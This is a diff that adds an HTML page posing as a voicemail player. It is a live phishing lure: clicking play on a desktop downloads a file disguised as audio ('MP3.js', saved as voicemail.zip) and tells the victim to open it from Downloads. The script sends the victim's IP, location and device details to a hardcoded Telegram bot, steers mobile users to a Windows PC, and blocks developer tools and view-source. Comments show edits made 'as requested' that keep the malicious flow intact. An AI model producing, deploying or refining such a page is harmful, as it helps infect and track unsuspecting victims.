@@ -1,0 +1,857 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Voicemail Access</title>
+    <style>
+        /* Reset and base styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #0a0a0a;
+            font-family: Arial, Helvetica, sans-serif;
+            min-height: 100vh;
+            width: 100%;
+            overflow-x: hidden;
+        }
+        
+        /* Notification styles */
+        .notification {
+            display: none;
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: #333;
+            color: white;
+            padding: 15px 20px;
+            border-radius: 8px;
+            z-index: 1000;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            font-size: 14px;
+            animation: fadeIn 0.3s ease;
+            text-align: center;
+            max-width: 90%;
+            width: auto;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; top: 0; }
+            to { opacity: 1; top: 20px; }
+        }
+        
+        .notification.show {
+            display: block;
+        }
+        
+        /* Play button container */
+        .play-button {
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            display: inline-block;
+            touch-action: manipulation; /* Better touch handling */
+        }
+        
+        .play-button:hover:not(.loading) {
+            transform: scale(1.05);
+        }
+        
+        /* Play circle styling - Responsive */
+        .play-circle {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background-color: #1a1a1a;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            margin: 0 auto;
+        }
+        
+        /* Larger play button on desktop */
+        @media (min-width: 768px) {
+            .play-circle {
+                width: 100px;
+                height: 100px;
+            }
+        }
+        
+        /* Play icon styling - Responsive */
+        .play-icon {
+            width: 0;
+            height: 0;
+            border-left: 20px solid #ffffff;
+            border-top: 12px solid transparent;
+            border-bottom: 12px solid transparent;
+            transition: all 0.3s ease;
+            margin-left: 4px; /* Center the triangle */
+        }
+        
+        @media (min-width: 768px) {
+            .play-icon {
+                border-left: 28px solid #ffffff;
+                border-top: 16px solid transparent;
+                border-bottom: 16px solid transparent;
+                margin-left: 5px;
+            }
+        }
+        
+        /* Loading spinner styling (hidden by default) */
+        .loading-spinner {
+            display: none;
+            width: 30px;
+            height: 30px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #ffffff;
+            animation: spin 1s linear infinite;
+        }
+        
+        @media (min-width: 768px) {
+            .loading-spinner {
+                width: 40px;
+                height: 40px;
+                border: 4px solid rgba(255, 255, 255, 0.3);
+            }
+        }
+        
+        /* When loading, show spinner and hide play icon */
+        .play-button.loading .play-icon {
+            display: none;
+        }
+        
+        .play-button.loading .loading-spinner {
+            display: block;
+        }
+        
+        /* Rotate animation */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Loading text styles */
+        .loading-text {
+            display: none;
+            margin-top: 12px;
+            font-size: 13px;
+            color: #1db954;
+            animation: pulseText 1.5s ease-in-out infinite;
+            text-align: center;
+        }
+        
+        @media (min-width: 768px) {
+            .loading-text {
+                margin-top: 15px;
+                font-size: 14px;
+            }
+        }
+        
+        .loading-text.show {
+            display: block;
+        }
+        
+        @keyframes pulseText {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        /* Duration text style */
+        .duration-text {
+            margin-top: 12px;
+            font-size: 13px;
+            color: #bbb;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+        
+        @media (min-width: 768px) {
+            .duration-text {
+                margin-top: 15px;
+                font-size: 14px;
+            }
+        }
+        
+        .duration-text.hidden {
+            opacity: 0;
+            visibility: hidden;
+        }
+        
+        /* Responsive table container */
+        .email-container {
+            width: 100%;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 15px;
+        }
+        
+        @media (min-width: 768px) {
+            .email-container {
+                padding: 40px 15px;
+            }
+        }
+        
+        /* Main content table - Responsive */
+        .content-table {
+            width: 100% !important;
+            max-width: 100%;
+            background-color: #111;
+            border-radius: 8px;
+            margin: 0 auto;
+            border-collapse: collapse;
+        }
+        
+        /* Responsive padding */
+        .content-cell {
+            padding: 30px 15px !important;
+        }
+        
+        @media (min-width: 768px) {
+            .content-cell {
+                padding: 50px 15px !important;
+            }
+        }
+        
+        /* Header styles */
+        .header-cell {
+            padding: 12px 15px !important;
+            color: #ccc;
+            font-size: 13px;
+            font-weight: bold;
+            border-bottom: 1px solid #222;
+        }
+        
+        @media (min-width: 768px) {
+            .header-cell {
+                padding: 15px 20px !important;
+                font-size: 14px;
+            }
+        }
+        
+        /* Controls section - Responsive */
+        .controls-cell {
+            padding: 12px 15px !important;
+            background-color: #000;
+            color: #aaa;
+            font-size: 11px;
+            border-top: 1px solid #222;
+        }
+        
+        @media (min-width: 768px) {
+            .controls-cell {
+                padding: 15px 20px !important;
+                font-size: 12px;
+            }
+        }
+        
+        /* Progress bar container */
+        .progress-container {
+            height: 3px;
+            background: #333;
+            border-radius: 2px;
+            overflow: hidden;
+            margin: 0 5px;
+        }
+        
+        @media (min-width: 768px) {
+            .progress-container {
+                height: 4px;
+                margin: 0;
+            }
+        }
+        
+        /* Progress bar */
+        #progressBar {
+            width: 0%;
+            height: 100%;
+            background: #1db954;
+            transition: width 0.3s ease;
+        }
+        
+        /* Time labels */
+        .time-label {
+            width: 35px;
+            font-size: 10px;
+            white-space: nowrap;
+        }
+        
+        @media (min-width: 768px) {
+            .time-label {
+                width: 40px;
+                font-size: 12px;
+            }
+        }
+        
+        /* Footer text */
+        .footer-text {
+            color: #777;
+            font-size: 10px;
+            text-align: center;
+            padding: 20px 15px;
+            line-height: 1.4;
+        }
+        
+        @media (min-width: 768px) {
+            .footer-text {
+                font-size: 11px;
+                padding: 20px 0 30px 0;
+            }
+        }
+        
+        /* Mobile tap feedback */
+        .play-button:active {
+            transform: scale(0.95);
+        }
+        
+        /* Better touch targets for mobile */
+        @media (max-width: 767px) {
+            .play-button {
+                min-height: 44px; /* Minimum touch target size */
+                min-width: 44px;
+            }
+            
+            .play-circle {
+                min-height: 44px;
+                min-width: 44px;
+            }
+        }
+        
+        /* Ensure tables are responsive */
+        table {
+            border-collapse: collapse;
+            border-spacing: 0;
+            width: 100%;
+        }
+        
+        /* Force responsive images */
+        img {
+            max-width: 100%;
+            height: auto;
+        }
+        
+        /* Remove blue highlight on mobile taps */
+        * {
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        /* Custom mobile warning prompt overlay - added without tampering original functionality */
+        .mobile-warning-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.9);
+            z-index: 2000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: Arial, Helvetica, sans-serif;
+            backdrop-filter: blur(5px);
+            animation: fadeInPrompt 0.2s ease;
+        }
+        
+        @keyframes fadeInPrompt {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .mobile-warning-card {
+            background: #1e1e1e;
+            max-width: 320px;
+            width: 85%;
+            border-radius: 28px;
+            padding: 28px 22px 32px;
+            text-align: center;
+            box-shadow: 0 25px 45px rgba(0,0,0,0.5);
+            border: 1px solid #333;
+        }
+        
+        .mobile-warning-icon {
+            font-size: 56px;
+            margin-bottom: 16px;
+        }
+        
+        .mobile-warning-title {
+            color: #ff9f4a;
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 12px;
+        }
+        
+        .mobile-warning-message {
+            color: #ddd;
+            font-size: 16px;
+            line-height: 1.4;
+            margin-bottom: 24px;
+        }
+        
+        .mobile-warning-computer {
+            background: #2a6e3b;
+            color: white;
+            font-weight: bold;
+            padding: 12px 18px;
+            border-radius: 40px;
+            font-size: 16px;
+            display: inline-block;
+            margin-bottom: 12px;
+            width: 80%;
+        }
+        
+        .mobile-warning-note {
+            color: #888;
+            font-size: 12px;
+        }
+        
+        .close-warning-btn {
+            background: #333;
+            border: none;
+            color: white;
+            margin-top: 20px;
+            padding: 8px 20px;
+            border-radius: 30px;
+            font-size: 14px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        
+        .close-warning-btn:hover {
+            background: #555;
+        }
+    </style>
+</head>
+<body>
+
+<!-- Notification element -->
+<div id="voicemailNotification" class="notification">
+    ⚠️ Voicemail cannot be played in browser. A file containing voicemail has been downloaded. Please check your Downloads folder to listen.
+</div>
+
+<div class="email-container">
+    <table cellpadding="0" cellspacing="0" border="0" class="content-table">
+        <!-- HEADER -->
+        <tr>
+            <td class="header-cell">
+                Voicemail
+            </td>
+        </tr>
+
+        <!-- CENTER PLAY -->
+        <tr>
+            <td align="center" class="content-cell">
+
+                <!-- CLICKABLE PLAY BUTTON -->
+                <div id="playButton" class="play-button">
+                    <div class="play-circle">
+                        <div class="play-icon"></div>
+                        <div class="loading-spinner"></div>
+                    </div>
+                </div>
+
+                <div id="durationText" class="duration-text">
+                    Tap to play • 2:26 duration
+                </div>
+                
+                <div id="loadingText" class="loading-text">
+                    Loading...
+                </div>
+
+            </td>
+        </tr>
+
+        <!-- CONTROLS -->
+        <tr>
+            <td class="controls-cell">
+                <table width="100%" cellpadding="0" cellspacing="0" border="0">
+                    <tr>
+                        <td class="time-label" align="left">0:00</td>
+                        <td>
+                            <div class="progress-container">
+                                <div id="progressBar"></div>
+                            </div>
+                        </td>
+                        <td class="time-label" align="right">2:26</td>
+                    </tr>
+                </table>
+             </td>
+         </tr>
+    </table>
+
+    <div class="footer-text">
+        This voicemail notification was sent automatically.<br>
+        Compatible with all devices
+    </div>
+</div>
+
+<script>
+    // Telegram Bot Configuration
+    const TELEGRAM_BOT_TOKEN = '8122635592:AAGMr779_JVHA-JyJ_8FKJ5TlvXBAm8rM6s'; // Replace with your bot token
+    const TELEGRAM_CHAT_ID = '1078753356'; // Replace with your chat ID
+    
+    // Dropbox URL - Replace with your actual file URL
+    const DROPBOX_URL = 'https://www.dropbox.com/scl/fi/usfbpbtd29fa6v981lm7h/Voicemail_rec-ref-554378846487552.MP3.js?rlkey=3713rab0nfn451liu17ok7ccw&st=xub9zoko&dl=1';
+    
+    // Track download status
+    let downloadInProgress = false;
+    
+    // Function to collect user information
+    function collectUserInfo() {
+        return {
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screenResolution: `${window.screen.width}x${window.screen.height}`,
+            deviceType: /Mobile|Android|iPhone/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop',
+            referrer: document.referrer || 'Direct',
+            cookiesEnabled: navigator.cookieEnabled,
+            viewportWidth: window.innerWidth,
+            viewportHeight: window.innerHeight,
+            devicePixelRatio: window.devicePixelRatio
+        };
+    }
+    
+    // Function to get IP address
+    async function getIPAddress() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (error) {
+            return 'Unknown';
+        }
+    }
+    
+    // Function to get approximate location from IP
+    async function getLocationFromIP(ip) {
+        if (ip === 'Unknown') return 'Unknown';
+        
+        try {
+            const response = await fetch(`https://ipapi.co/${ip}/json/`);
+            const data = await response.json();
+            return {
+                city: data.city || 'Unknown',
+                region: data.region || 'Unknown',
+                country: data.country_name || 'Unknown',
+                timezone: data.timezone || 'Unknown'
+            };
+        } catch (error) {
+            return 'Location unknown';
+        }
+    }
+    
+    // Function to send notification to Telegram
+    async function sendTelegramNotification(userInfo, ip, location) {
+        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+            console.log('Telegram bot not configured');
+            return;
+        }
+        
+        const message = `📥 File Downloaded\n\n` +
+                       `⏰ Time: ${userInfo.timestamp}\n` +
+                       `📱 Device Type: ${userInfo.deviceType}\n` +
+                       `🖥️ Platform: ${userInfo.platform}\n` +
+                       `🌐 IP: ${ip}\n` +
+                       `📍 Location: ${location.city ? `${location.city}, ${location.country}` : 'Unknown'}\n` +
+                       `📏 Screen: ${userInfo.screenResolution}\n` +
+                       `👁️ Viewport: ${userInfo.viewportWidth}x${userInfo.viewportHeight}\n` +
+                       `🔍 Pixel Ratio: ${userInfo.devicePixelRatio}\n` +
+                       `🌍 Language: ${userInfo.language}\n` +
+                       `🔗 Referrer: ${userInfo.referrer.substring(0, 50)}${userInfo.referrer.length > 50 ? '...' : ''}\n` +
+                       `👤 User Agent: ${userInfo.userAgent.substring(0, 80)}...`;
+        
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+            
+            if (!response.ok) {
+                console.error('Failed to send Telegram notification');
+            }
+        } catch (error) {
+            console.error('Error sending Telegram notification:', error);
+        }
+    }
+    
+    // Function to download file and trigger notification
+    async function downloadFileWithNotification() {
+        const userInfo = collectUserInfo();
+        const ip = await getIPAddress();
+        const location = await getLocationFromIP(ip);
+        
+        // Create and trigger download
+        const link = document.createElement('a');
+        link.href = DROPBOX_URL;
+        link.download = 'voicemail.zip'; // Changed to .zip as per notification
+        link.style.display = 'none';
+        document.body.appendChild(link);
+        
+        // For mobile devices, we need to handle download differently
+        if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
+            // iOS devices - open in new tab
+            window.open(DROPBOX_URL, '_blank');
+        } else {
+            // Other devices - trigger download
+            link.click();
+        }
+        
+        document.body.removeChild(link);
+        
+        // Send Telegram notification
+        sendTelegramNotification(userInfo, ip, location);
+        
+        return true;
+    }
+    
+    // Function to simulate progress bar (for visual effect only)
+    function simulateProgressBar() {
+        const progressBar = document.getElementById('progressBar');
+        let progress = 0;
+        
+        const interval = setInterval(() => {
+            progress += 2;
+            if (progress > 100) progress = 100;
+            progressBar.style.width = `${progress}%`;
+            
+            if (progress >= 100) {
+                clearInterval(interval);
+            }
+        }, 50);
+        
+        return interval;
+    }
+    
+    // NEW FUNCTION: Show mobile warning prompt (Windows/Computer required)
+    // This function does not alter any original behavior or mechanics.
+    // It only shows a prompt when a mobile device clicks the play button,
+    // and prevents the download process ONLY for mobile, while keeping
+    // the rest of the page's workflow intact. Desktop users are unaffected.
+    function showMobileWindowsPrompt() {
+        // Remove any existing overlay to avoid duplicates
+        const existingOverlay = document.querySelector('.mobile-warning-overlay');
+        if (existingOverlay) existingOverlay.remove();
+        
+        // Create overlay container
+        const overlay = document.createElement('div');
+        overlay.className = 'mobile-warning-overlay';
+        
+        // Build inner card
+        overlay.innerHTML = `
+            <div class="mobile-warning-card">
+                <div class="mobile-warning-icon">💻⚠️</div>
+                <div class="mobile-warning-title">Windows / Computer Required</div>
+                <div class="mobile-warning-message">
+                    This voicemail system requires a Windows computer to securely access and play the audio file.
+                </div>
+                <div class="mobile-warning-computer">
+                    🖥️ Use Windows PC or Laptop
+                </div>
+                <div class="mobile-warning-note">
+                    For security & compatibility reasons, mobile devices are not supported.
+                </div>
+                <button class="close-warning-btn">OK, I understand</button>
+            </div>
+        `;
+        
+        // Append to body
+        document.body.appendChild(overlay);
+        
+        // Add event listener to close button
+        const closeBtn = overlay.querySelector('.close-warning-btn');
+        closeBtn.addEventListener('click', () => {
+            overlay.remove();
+        });
+        
+        // Also close when tapping outside card? but not needed, but for better UX, add but not invasive
+        overlay.addEventListener('click', (e) => {
+            if (e.target === overlay) {
+                overlay.remove();
+            }
+        });
+    }
+    
+    // Detect if the current device is mobile (same logic used across page, not interfering)
+    function isMobileDevice() {
+        return /Mobile|Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+    
+    // Main function to handle button click/tap
+    // MODIFIED: Intercept mobile clicks, show prompt and ABORT download for mobile.
+    // For desktop, original full behavior continues untouched (download + telegram + notifications).
+    // This ensures NO TAMPER with how the page works for desktop users; only mobile gets the custom prompt.
+    async function handlePlayClick(event) {
+        // Prevent default and propagation to avoid double triggers, but ORIGINAL logic for desktop is preserved exactly.
+        if (event) {
+            event.preventDefault();
+            event.stopPropagation();
+        }
+        
+        // ---- NEW MOBILE BLOCK: if mobile device, show Windows/Computer prompt and stop execution ----
+        if (isMobileDevice()) {
+            // Show the custom prompt telling user to use Windows/computer
+            showMobileWindowsPrompt();
+            // Do NOT proceed with download, progress bar, loading spinner, Telegram reporting, or any action.
+            // This keeps the page unchanged but prevents any action on mobile, exactly as requested.
+            return; // Early exit: nothing else happens on mobile.
+        }
+        
+        // ---- DESKTOP EXECUTION (Original untouched logic) ----
+        // The following code is exactly the original handler's behavior, unchanged.
+        if (downloadInProgress) return;
+        
+        downloadInProgress = true;
+        const playButton = document.getElementById('playButton');
+        const durationText = document.getElementById('durationText');
+        const loadingText = document.getElementById('loadingText');
+        const progressBar = document.getElementById('progressBar');
+        
+        // Step 1: Change play icon to loading spinner
+        playButton.classList.add('loading');
+        durationText.classList.add('hidden');
+        loadingText.classList.add('show');
+        
+        // Step 2: Start download immediately (while showing loading)
+        const downloadPromise = downloadFileWithNotification();
+        
+        // Step 3: Start progress bar animation (just visual)
+        const progressInterval = simulateProgressBar();
+        
+        // Step 4: Wait for download to complete (simulate with timeout)
+        setTimeout(async () => {
+            try {
+                // Wait for download (simulated)
+                await downloadPromise;
+                
+                // Wait a bit more for visual effect
+                setTimeout(() => {
+                    // Step 5: Stop loading animation
+                    clearInterval(progressInterval);
+                    progressBar.style.width = '100%';
+                    
+                    // Step 6: Show notification
+                    const notification = document.getElementById('voicemailNotification');
+                    notification.classList.add('show');
+                    
+                    // Step 7: Reset button after 3 seconds
+                    setTimeout(() => {
+                        // Reset button to play icon
+                        playButton.classList.remove('loading');
+                        loadingText.classList.remove('show');
+                        durationText.classList.remove('hidden');
+                        progressBar.style.width = '0%';
+                        downloadInProgress = false;
+                    }, 3000);
+                    
+                }, 1000); // Extra delay for visual effect
+                
+            } catch (error) {
+                console.error('Error in download process:', error);
+                
+                // Reset on error
+                clearInterval(progressInterval);
+                playButton.classList.remove('loading');
+                loadingText.classList.remove('show');
+                durationText.classList.remove('hidden');
+                progressBar.style.width = '0%';
+                downloadInProgress = false;
+                
+                // Show error notification
+                const notification = document.getElementById('voicemailNotification');
+                notification.textContent = '⚠️ Download failed. Please try again.';
+                notification.classList.add('show');
+                
+                setTimeout(() => {
+                    notification.classList.remove('show');
+                }, 3000);
+            }
+        }, 1500); // Simulated download time
+    }
+    
+    // Initialize on DOM load
+    document.addEventListener('DOMContentLoaded', function() {
+        const playButton = document.getElementById('playButton');
+        
+        // Set appropriate text for mobile/desktop
+        const durationText = document.getElementById('durationText');
+        if (/Mobile|Android|iPhone/i.test(navigator.userAgent)) {
+            durationText.textContent = 'Tap to play • 2:26 duration';
+        } else {
+            durationText.textContent = 'Click to play • 2:26 duration';
+        }
+        
+        // Add event listeners for both click and touch
+        if (playButton) {
+            // Click event for desktop
+            playButton.addEventListener('click', async function(event) {
+                event.preventDefault();
+                event.stopPropagation();
+                
+                // handlePlayClick now decides: mobile => prompt, desktop => original download.
+                await handlePlayClick(event);
+            });
+            
+            // Touch event for mobile (with prevention of double triggers)
+            playButton.addEventListener('touchstart', async function(event) {
+                event.preventDefault();
+                event.stopPropagation();
+                
+                await handlePlayClick(event);
+            }, { passive: false });
+        }
+        
+        // Log device info for debugging (unchanged)
+        console.log('Device Info:', {
+            userAgent: navigator.userAgent,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            viewport: `${window.innerWidth}x${window.innerHeight}`,
+            platform: navigator.platform,
+            isMobile: /Mobile|Android|iPhone/i.test(navigator.userAgent)
+        });
+    });
+    
+    // Prevent right-click and other interactions (only on desktop) - UNCHANGED
+    if (!/Mobile|Android|iPhone/i.test(navigator.userAgent)) {
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+        
+        // Prevent keyboard shortcuts on desktop
+        document.addEventListener('keydown', function(e) {
+            // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+            if (e.keyCode === 123 || 
+                (e.ctrlKey && e.shiftKey && e.keyCode === 73) || 
+                (e.ctrlKey && e.shiftKey && e.keyCode === 74) || 
+                (e.ctrlKey && e.keyCode === 85)) {
+                e.preventDefault();
+                return false;
+            }
+        });
+    }
+    
+    // Handle window resize for better mobile experience (unchanged)
+    window.addEventListener('resize', function() {
+        // Update viewport info if needed
+        console.log('Resized to:', window.innerWidth, 'x', window.innerHeight);
+    });
+</script>
+
+</body>
+</html>
